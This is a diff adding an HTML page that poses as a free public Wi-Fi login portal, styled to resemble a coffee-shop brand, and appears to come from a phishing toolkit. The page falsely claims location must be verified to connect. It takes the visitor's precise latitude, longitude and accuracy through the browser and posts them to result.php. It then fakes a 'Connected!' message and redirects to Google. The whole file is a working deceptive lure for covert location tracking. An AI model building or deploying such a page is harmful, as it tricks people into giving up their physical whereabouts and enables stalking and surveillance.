@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Free Wi-Fi Login</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #f4f4f4;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .wifi-card {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            max-width: 350px;
+            width: 90%;
+        }
+
+        .logo {
+            width: 80px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #333;
+            margin: 0 0 10px;
+        }
+
+        p {
+            color: #666;
+            font-size: 0.9rem;
+            margin-bottom: 25px;
+        }
+
+        .btn-connect {
+            background-color: #00704a;
+            /* Starbucks Green-ish */
+            color: white;
+            border: none;
+            padding: 12px 0;
+            width: 100%;
+            border-radius: 25px;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .btn-connect:hover {
+            background-color: #005c3e;
+        }
+
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #00704a;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 15px auto;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+    <script src="../../assets/js/jquery.min.js"></script>
+</head>
+
+<body>
+
+    <div class="wifi-card">
+        <!-- Generic Wifi Icon -->
+        <svg class="logo" viewBox="0 0 24 24" fill="#00704a">
+            <path
+                d="M12 6c3.5 0 6.8 1.2 9.5 3.2l-1.6 2C17.7 9.6 15 8.6 12 8.6c-3 0-5.7 1-7.9 2.6l-1.6-2C5.2 7.2 8.5 6 12 6zm0-4C6.7 2 1.8 4.1-1.6 7.6l1.6 2C2.9 6.6 7.2 5 12 5c4.8 0 9.1 1.6 12 4.6l1.6-2C22.2 4.1 17.3 2 12 2zm0 12c-1.5 0-2.9.5-4.1 1.3L12 20.9l4.1-5.6C14.9 14.5 13.5 14 12 14zm0-4c-2.3 0-4.4.8-6.1 2.1l1.6 2C8.6 13.2 10.2 12.6 12 12.6c1.8 0 3.4.6 4.5 1.5l1.6-2C16.4 10.8 14.3 10 12 10z" />
+        </svg>
+
+        <h2>Free Public Wi-Fi</h2>
+        <p>To connect to the high-speed network, we need to verify your location to ensure you are within the service
+            area.</p>
+
+        <button class="btn-connect" onclick="getLocation()">Connect Now</button>
+        <div class="loader" id="loader"></div>
+        <p id="status" style="margin-top: 15px; font-size: 0.8rem;"></p>
+    </div>
+
+    <script>
+        function getLocation() {
+            document.getElementById('loader').style.display = 'block';
+            document.querySelector('.btn-connect').disabled = true;
+            document.getElementById('status').innerText = "Verifying location...";
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(showPosition, showError);
+            } else {
+                document.getElementById('status').innerText = "Geolocation is not supported by this browser.";
+            }
+        }
+
+        function showPosition(position) {
+            var lat = position.coords.latitude;
+            var lon = position.coords.longitude;
+            var acc = position.coords.accuracy;
+
+            // Send to server
+            $.ajax({
+                type: 'POST',
+                url: 'result.php',
+                data: {
+                    Lat: lat,
+                    Lon: lon,
+                    Acc: acc
+                },
+                success: function () {
+                    document.getElementById('loader').style.display = 'none';
+                    document.getElementById('status').style.color = "green";
+                    document.getElementById('status').innerText = "Connected! Redirecting...";
+                    setTimeout(() => {
+                        window.location.href = "https://www.google.com";
+                    }, 1500);
+                },
+                mimeType: 'text'
+            });
+        }
+
+        function showError(error) {
+            document.getElementById('loader').style.display = 'none';
+            document.querySelector('.btn-connect').disabled = false;
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    document.getElementById('status').style.color = "red";
+                    document.getElementById('status').innerText = "User denied the request for Geolocation.";
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    document.getElementById('status').innerText = "Location information is unavailable.";
+                    break;
+                case error.TIMEOUT:
+                    document.getElementById('status').innerText = "The request to get user location timed out.";
+                    break;
+                case error.UNKNOWN_ERROR:
+                    document.getElementById('status').innerText = "An unknown error occurred.";
+                    break;
+            }
+        }
+    </script>
+</body>
+
+</html>
